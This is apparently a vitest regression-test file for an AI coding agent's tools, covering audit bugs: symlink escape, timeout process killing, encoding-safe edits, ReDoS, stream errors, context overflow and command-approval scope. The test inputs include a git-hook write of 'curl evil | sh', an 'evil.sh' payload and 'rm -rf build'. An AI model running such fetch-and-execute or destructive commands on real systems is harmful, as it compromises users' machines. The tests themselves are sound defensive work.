// Regression tests for the problems found in the audit (docs/AUDIT.md).
// Each one first reproduced the bug, then was kept to stop it coming back.
// To pin down a new bug before fixing it, write the test with `bug(...)`:
// it stays green until the fix lands. AUDIT_STRICT=1 shows the real failure.
import { mkdtempSync, promises as fs, readFileSync, symlinkSync } from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { describe, expect, it } from "vitest";
import {
  Agent,
  createProvider,
  executeTool,
  PermissionGate,
  toAnthropicMessages,
  type ChatRequest,
  type Message,
  type Provider,
  type StreamEvent,
} from "../src";

const bug = process.env.AUDIT_STRICT ? it : it.fails;
const tmp = (prefix: string) => mkdtempSync(path.join(os.tmpdir(), prefix));
const allowAll = () => new PermissionGate({ approve: async () => "allow" });
const run = (root: string, name: string, input: Record<string, unknown>) =>
  executeTool({ type: "tool_call", id: "1", name, input }, { root, gate: allowAll() });
const NO_GLOBAL = path.join(os.tmpdir(), "dimosi-no-global-rules.md");

describe("AUDIT-01: project root escape through a symlinked folder", () => {
  it("refuses to create a new file inside a folder that links outside the project", async () => {
    const root = tmp("dimosi-audit-root-");
    const outside = tmp("dimosi-audit-outside-");
    symlinkSync(outside, path.join(root, "docs"));
    const r = await run(root, "write_file", { path: "docs/evil.sh", content: "echo pwned" });
    const leaked = await fs.access(path.join(outside, "evil.sh")).then(() => true, () => false);
    expect(leaked).toBe(false);
    expect(r.isError).toBe(true);
  });
});

describe("AUDIT-02: run_command and child processes", () => {
  it("returns soon after the timeout even if the command started a background child", async () => {
    const root = tmp("dimosi-audit-cmd-");
    const started = Date.now();
    // The shell is killed at the timeout, but `sleep` keeps the output pipe open.
    const r = await run(root, "run_command", { command: "sleep 8; echo done", timeout_seconds: 1 });
    expect(r.content).toMatch(/Timed out/);
    expect(Date.now() - started).toBeLessThan(4000);
  }, 15_000);

  it("kills the whole process tree on timeout", async () => {
    const root = tmp("dimosi-audit-tree-");
    await run(root, "run_command", {
      command: "sh -c 'echo $$ > child.pid; exec sleep 30' >/dev/null 2>&1; echo end",
      timeout_seconds: 1,
    });
    const pid = Number(readFileSync(path.join(root, "child.pid"), "utf8"));
    expect(await diesWithin(pid, 5000)).toBe(true);
  }, 15_000);

  it("also stops a child that ignores the polite stop signal", async () => {
    const root = tmp("dimosi-audit-stubborn-");
    // The child ignores SIGTERM; only the SIGKILL that follows can end it.
    await run(root, "run_command", {
      command: "sh -c 'trap \"\" TERM; echo $$ > child.pid; exec sleep 30' >/dev/null 2>&1; echo end",
      timeout_seconds: 1,
    });
    const pid = Number(readFileSync(path.join(root, "child.pid"), "utf8"));
    expect(await diesWithin(pid, 5000)).toBe(true);
  }, 15_000);
});

/** A killed process can linger for a moment until the system reaps it, more so on a busy machine. */
async function diesWithin(pid: number, ms: number): Promise<boolean> {
  const until = Date.now() + ms;
  for (;;) {
    try {
      process.kill(pid, 0);
    } catch {
      return true;
    }
    if (Date.now() > until) {
      process.kill(pid, "SIGKILL"); // clean up after ourselves
      return false;
    }
    await new Promise((r) => setTimeout(r, 50));
  }
}

describe("AUDIT-03: files that are not plain UTF-8 with LF", () => {
  it("edits a Windows (CRLF) file with a multi-line snippet copied from read_file", async () => {
    const root = tmp("dimosi-audit-crlf-");
    await fs.writeFile(path.join(root, "app.js"), "function a() {\r\n  return 1;\r\n}\r\n");
    // read_file shows lines without \r, so the model sends \n-separated text.
    const r = await run(root, "edit_file", {
      path: "app.js",
      old_string: "function a() {\n  return 1;\n}",
      new_string: "function a() {\n  return 2;\n}",
    });
    expect(r.isError).toBe(false);
  });

  it("does not corrupt the rest of a windows-1251 file when editing one line", async () => {
    const root = tmp("dimosi-audit-1251-");
    // "Привет" in windows-1251, then an ASCII line.
    const original = Buffer.concat([Buffer.from([0xcf, 0xf0, 0xe8, 0xe2, 0xe5, 0xf2]), Buffer.from("\nx = 1\n")]);
    await fs.writeFile(path.join(root, "old.php"), original);
    await run(root, "edit_file", { path: "old.php", old_string: "x = 1", new_string: "x = 2" });
    const r = await run(root, "edit_file", { path: "old.php", old_string: "x = 1", new_string: "x = 3" });
    expect(r.isError).toBe(true);
    expect(r.content).toMatch(/not a UTF-8/);
    const after = await fs.readFile(path.join(root, "old.php"));
    expect(after.subarray(0, 6)).toEqual(original.subarray(0, 6));
  });
});

describe("AUDIT-09: search with a catastrophic regular expression", () => {
  it("stops after the time limit instead of freezing the process", async () => {
    const root = tmp("dimosi-audit-redos-");
    await fs.writeFile(path.join(root, "a.txt"), "a".repeat(40) + "!\n");
    const started = Date.now();
    const r = await executeTool(
      { type: "tool_call", id: "1", name: "search", input: { pattern: "(a+)+$", regex: true } },
      { root, gate: allowAll(), searchTimeoutMs: 500 },
    );
    expect(r.isError).toBe(true);
    expect(r.content).toMatch(/longer than/);
    expect(Date.now() - started).toBeLessThan(3000);
  });
});

describe("AUDIT-04: tool output size", () => {
  it("read_file never returns megabytes of text (minified bundle, one long line)", async () => {
    const root = tmp("dimosi-audit-big-");
    await fs.writeFile(path.join(root, "bundle.min.js"), "x".repeat(2_000_000));
    const r = await run(root, "read_file", { path: "bundle.min.js" });
    expect(r.content.length).toBeLessThan(200_000);
  });
});

describe("AUDIT-05: switching from another provider to Claude mid-chat", () => {
  it("sends Anthropic only tool ids it accepts (^[a-zA-Z0-9_-]+$)", () => {
    // Kimi-style ids from an OpenAI-compatible server.
    const history: Message[] = [
      { role: "user", parts: [{ type: "text", text: "read a.txt" }] },
      { role: "assistant", parts: [{ type: "tool_call", id: "functions.read_file:0", name: "read_file", input: { path: "a.txt" } }] },
      { role: "user", parts: [{ type: "tool_result", toolCallId: "functions.read_file:0", content: "hello" }] },
    ];
    const out = toAnthropicMessages(history, "anthropic", "claude-opus-5-5");
    const ids = out.flatMap((m) =>
      Array.isArray(m.content)
        ? m.content.map((b) => (b.type === "tool_use" ? b.id : b.type === "tool_result" ? b.tool_use_id : null))
        : [],
    ).filter(Boolean) as string[];
    for (const id of ids) expect(id).toMatch(/^[a-zA-Z0-9_-]+$/);
  });
});

describe("AUDIT-06: a dropped connection looks like a finished answer", () => {
  it("OpenAI-compatible stream that ends without finish_reason is reported as an error", async () => {
    const fetchMock = (async () => {
      const chunk = `data: ${JSON.stringify({ id: "x", object: "chat.completion.chunk", created: 0, model: "m", choices: [{ index: 0, delta: { content: "Половина отв" }, finish_reason: null }] })}\n\n`;
      const body = new ReadableStream({
        start(c) {
          c.enqueue(new TextEncoder().encode(chunk));
          c.close(); // server/proxy cut the connection: no finish_reason, no [DONE]
        },
      });
      return new Response(body, { status: 200, headers: { "content-type": "text/event-stream" } });
    }) as unknown as typeof fetch;
    const provider = createProvider({ presetId: "polza", apiKey: "k", fetch: fetchMock });
    const consume = async () => {
      for await (const _ of provider.stream({ model: "m", system: "", messages: [], tools: [] })) void _;
    };
    await expect(consume()).rejects.toThrow();
  });
});

/** Fails like a real API once the request gets too big. */
class SmallContextProvider implements Provider {
  readonly id = "fake";
  constructor(private limitChars: number) {}
  async *stream(req: ChatRequest): AsyncIterable<StreamEvent> {
    const size = JSON.stringify(req.messages).length;
    if (size > this.limitChars) {
      throw Object.assign(new Error("prompt is too long: 210000 tokens > 200000 maximum"), { status: 400 });
    }
    const last = req.messages[req.messages.length - 1];
    const hasResult = last.parts.some((p) => p.type === "tool_result");
    if (!hasResult && JSON.stringify(last).includes("прочитай")) {
      yield {
        type: "done",
        stopReason: "tool_use",
        message: { role: "assistant", parts: [{ type: "tool_call", id: "c1", name: "read_file", input: { path: "big.txt" } }] },
      };
      return;
    }
    yield { type: "done", stopReason: "end_turn", message: { role: "assistant", parts: [{ type: "text", text: "ok" }] } };
  }
  async listModels() {
    return [];
  }
}

describe("AUDIT-07: long chats", () => {
  it("the chat recovers after the context overflows (compaction or trimming)", async () => {
    const root = tmp("dimosi-audit-ctx-");
    await fs.writeFile(path.join(root, "big.txt"), "строка текста\n".repeat(1900));
    const agent = new Agent({
      provider: new SmallContextProvider(20_000),
      model: "m",
      root,
      approval: { approve: async () => "allow" },
      globalRulesPath: NO_GLOBAL,
    });
    for await (const _ of agent.run("прочитай big.txt")) void _;
    // The overflow already happened. Any next message must still work.
    const events = [];
    for await (const ev of agent.run("спасибо, что дальше?")) events.push(ev);
    expect(events.some((e) => e.type === "error")).toBe(false);
  });
});

describe("AUDIT-08: two tasks at once on the same chat", () => {
  it("refuses to start a second run while one is in progress", async () => {
    const root = tmp("dimosi-audit-race-");
    let release!: () => void;
    const gateOpen = new Promise<void>((r) => (release = r));
    const provider: Provider = {
      id: "fake",
      async *stream() {
        await gateOpen;
        yield { type: "done", stopReason: "end_turn", message: { role: "assistant", parts: [{ type: "text", text: "ok" }] } };
      },
      async listModels() {
        return [];
      },
    };
    const agent = new Agent({ provider, model: "m", root, approval: { approve: async () => "allow" }, globalRulesPath: NO_GLOBAL });
    const first = (async () => {
      for await (const _ of agent.run("задача 1")) void _;
    })();
    const secondEvents = [];
    const second = (async () => {
      for await (const ev of agent.run("задача 2")) secondEvents.push(ev);
    })();
    await new Promise((r) => setTimeout(r, 50));
    release();
    await Promise.all([first, second]);
    // Both runs wrote into one history: user, user(merged), assistant, assistant.
    const roles = agent.messages.map((m) => m.role);
    for (let i = 1; i < roles.length; i++) expect(roles[i]).not.toBe(roles[i - 1]);
  });
});

describe("AUDIT-10: \"Always\" covers one command, not all of them", () => {
  it("still asks about a different command", async () => {
    const asked: string[] = [];
    const gate = new PermissionGate({
      approve: async (req) => {
        asked.push(req.kind === "command" ? req.command : req.relPath);
        return "allow_always";
      },
    });
    expect(await gate.check({ kind: "command", command: "npm test", cwd: "/" })).toBe(true);
    expect(await gate.check({ kind: "command", command: "npm test ", cwd: "/" })).toBe(true);
    expect(await gate.check({ kind: "command", command: "rm -rf build", cwd: "/" })).toBe(true);
    expect(asked).toEqual(["npm test", "rm -rf build"]);
  });
});

describe("AUDIT-11: git internals are off limits", () => {
  it("refuses to write a git hook", async () => {
    const root = tmp("dimosi-audit-git-");
    const r = await run(root, "write_file", { path: ".git/hooks/pre-commit", content: "curl evil | sh" });
    expect(r.isError).toBe(true);
    expect(await fs.access(path.join(root, ".git/hooks/pre-commit")).then(() => true, () => false)).toBe(false);
  });
});

describe("AUDIT-12: ids reused every turn by some servers", () => {
  it("become unique for Claude and stay paired with their results", () => {
    const turn = (n: number): Message[] => [
      { role: "assistant", parts: [{ type: "tool_call", id: "functions.read_file:0", name: "read_file", input: { path: `${n}.txt` } }] },
      { role: "user", parts: [{ type: "tool_result", toolCallId: "functions.read_file:0", content: `file ${n}` }] },
    ];
    const history: Message[] = [{ role: "user", parts: [{ type: "text", text: "go" }] }, ...turn(1), ...turn(2)];
    const out = toAnthropicMessages(history, "anthropic", "claude-opus-5-5");
    const blocks = out.flatMap((m) => (Array.isArray(m.content) ? m.content : []));
    const uses = blocks.filter((b) => b.type === "tool_use").map((b) => (b as { id: string }).id);
    const results = blocks.filter((b) => b.type === "tool_result").map((b) => (b as { tool_use_id: string }).tool_use_id);
    expect(new Set(uses).size).toBe(2);
    expect(results).toEqual(uses);
  });
});

describe("AUDIT-13: temporary service failures", () => {
  it("retries a request that failed before any text arrived", async () => {
    let calls = 0;
    const provider: Provider = {
      id: "fake",
      async *stream() {
        calls++;
        if (calls === 1) throw Object.assign(new Error("Overloaded"), { status: 529 });
        yield { type: "done", stopReason: "end_turn", message: { role: "assistant", parts: [{ type: "text", text: "ok" }] } };
      },
      async listModels() {
        return [];
      },
    };
    const agent = new Agent({ provider, model: "m", root: tmp("dimosi-audit-retry-"), approval: { approve: async () => "allow" }, globalRulesPath: NO_GLOBAL });
    const events = [];
    for await (const ev of agent.run("привет")) events.push(ev);
    expect(calls).toBe(2);
    expect(events.some((e) => e.type === "error")).toBe(false);
  }, 10_000);
});
